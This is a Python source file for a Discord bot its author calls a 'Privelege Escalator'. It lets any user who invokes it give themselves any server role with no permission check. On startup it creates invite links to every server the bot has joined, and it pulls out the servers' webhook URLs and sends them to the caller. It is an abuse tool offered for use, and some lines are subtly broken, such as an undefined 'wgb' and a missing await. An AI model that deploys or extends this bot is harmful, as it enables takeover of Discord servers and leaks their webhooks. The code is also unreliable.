#!/usr/bin/python3
# Note! this may not work if bot dont have admin permission or enough permissions to do this stuffs!.

import discord
from discord.ext import commands

priv_escaltor = commands.Bot(command_prefix='.')
bot_token = '' # Paste bot token inside the string.

# Automatically generate Invite link on bot run.
@priv_escaltor.event
async def on_ready():
	print('Privelege Escalator bot online!')
	text_channel_list = []
	for server in priv_escaltor.guilds:
		for channel in server.channels:
			if str(channel.type) == 'text':
				channel = priv_escaltor.get_channel(int(channel.id))
				link = await channel.create_invite(max_age = 300)
				print(f"Discord Channel Invite Link: {link}")
				break


# Used to add anyroles for yourself depends on bots privelege/permissions.
@priv_escaltor.command()
async def add(uwu,role_name):
	user = uwu.message.author
	Role = discord.utils.get(user.guild.roles, name=f"{role_name}")
	await user.add_roles(Role)

# Use to Create/Generate Server Invite link.
@priv_escaltor.command()
async def inv(uwu, ch_id):
	channel = priv_escaltor.get_channel(int(ch_id))
	link = await channel.create_invite(max_age = 300)
	await uwu.reply(f"Heres your invite: {link}")


# Used to Create/Generate webhook
@priv_escaltor.command()
async def hooks(uwu):
	for hook in uwu.guild.webhooks():
		print(f'\n{hook.name}\n{hook.url}')
		user = await wgb.fetch_user(uwu.author.id)
		await user.send(f'\n{hook.name}\n{hook.url}')

# Print All Current Webhooks.
@priv_escaltor.command()
async def urls(ctx):
	content = "\n".join([f"{w.name} - {w.url}" for w in await ctx.guild.webhooks()])
	print(f"{content}\n")


priv_escaltor.run(bot_token)

